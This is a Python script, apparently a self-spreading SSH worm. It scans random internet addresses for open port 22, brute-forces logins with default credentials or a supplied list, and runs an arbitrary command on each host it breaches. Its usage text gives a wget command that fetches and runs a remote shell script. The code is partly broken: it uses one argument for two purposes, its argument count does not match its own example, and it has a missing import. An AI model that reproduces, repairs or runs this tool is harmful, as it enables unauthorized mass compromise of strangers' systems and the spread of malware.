import threading, paramiko, os, sys
from scapy.all import *

_crdntl = ["admin:1234", "admin:admin", "guest:guest", "root:toor"]
_blklst = ["127.0", "10.0", "192.168"]

_scanip = 0
_active = 0
_breach = []

def _inject():
    global _scanip, _active, _breach, _crdntl
    
    # generate IP address
    while True:
        _isBad = False
        _ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
                
        # confirm IP is not blacklisted
        if sys.argv[5].lower() == 'y':
            for y in _blklst:
                if _ip.startswith(y):
                    _isBad = True
                            
        if _isBad == False:
            break
    
    # Perform SYN scan to determine if SSH is open
    response = sr1(IP(dst=_ip)/TCP(dport=22, flags="S"), timeout=int(sys.argv[3]), verbose=0)
    if response and response.haslayer(TCP):
        if response[TCP].flags == 0x12:
            print('---> SSH OPEN @ ' + _ip + ":22. Attempting to breach...")
         
        # iterate through password list
        for cred in _crdntl:
            try:
                # idenfity username and password
                _usr, _pwd = cred.split(':')

                # Setup SSH connection...
                try:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(hostname=_ip, port=22, username=_usr, password=_pwd, timeout=1)
                    
                    client.exec_command(sys.argv[5], timeout=5)
                    client.close()
                    print('SSH CONNECTION BREACHES @ ' + _ip + ':22 with credentials ' + _usr + ':' + _pwd)
                except ConnectionResetError:
                    print('IP ' + _ip + ':22 rejected probe...')
                
            except:
                pass
                                
    else:
        print('No SSH connection @ ' + _ip + ':22')

    # increase IP count if specified                
    if not sys.argv[1] == '0':
        _scanip +=1
    # signify thread closure
    _active -=1

def main():
    os.system('clear')
    
    # usage information
    if len(sys.argv) != 6:
        sys.exit("""Usage: <# of ips to generate | 0=infinite>
       <# of threads>
       <timeout in seconds>
       <combolist.txt | 0=default credentials>
       <'your command in quotes'>
                           
Example:
150 10 1 combo.txt y 'wget http://site.com/file.sh -P /tmp && ./tmp/file.sh'\r\n""")
                    
    # ensure script has root privileges
    if not os.geteuid() == 0:
        sys.exit('Script requires root elevation!\r\n')
    
    global _active, _scanip, _crdntl
    
    if not sys.argv[4] == '0':
        # import combolist contents to list
        print('Importing password list! Stand-by...\r\n')
        try:
            with open(sys.argv[4], "r") as f:
                for line in f:
                    if "\n" in line:
                        # remove new-line feed
                        line = line.replace("\n", "")
                        _crdntl.append(line)
                    else:
                        _crdntl.append(line)
        except KeyboardInterrupt:
            sys.exit("\r\nOperation aborted by user!\r\n")
        except:
            # list empty/unavailable. Defaulting to preset credentials
            pass
        
    print('''
░█▀▀░█▀▀░█░░░█▀▀░░░░░█▀▄░█▀▀░█▀▄░░░░░░█▀▀░█▀▀░█░█░
░▀▀█░█▀▀░█░░░█▀▀░▀▀▀░█▀▄░█▀▀░█▀░░▀▀▀░░▀▀█░▀▀█░█▀█░
░▀▀▀░▀▀▀░▀▀▀░▀░░░░░░░▀░▀░▀▀▀░▀░░░░░░░░▀▀▀░▀▀▀░▀░▀░
Strike <CTRL+C> to abort...
''')
    
    # scan till IP count / wait infinitely 
    while _scanip <= int(sys.argv[1]):
        try:
            # ensure user-specified thread count
            while _active <= int(sys.argv[2]):
                try:
                    f = threading.Thread(target=_inject)
                    f.daemon = True
                    f.start()
                    _active +=1
                except KeyboardInterrupt:
                    sys.exit()
        except KeyboardInterrupt:
            sys.exit('\r\nAborted by user...')
            
    sys.exit()
    
if __name__ == "__main__":
    main()
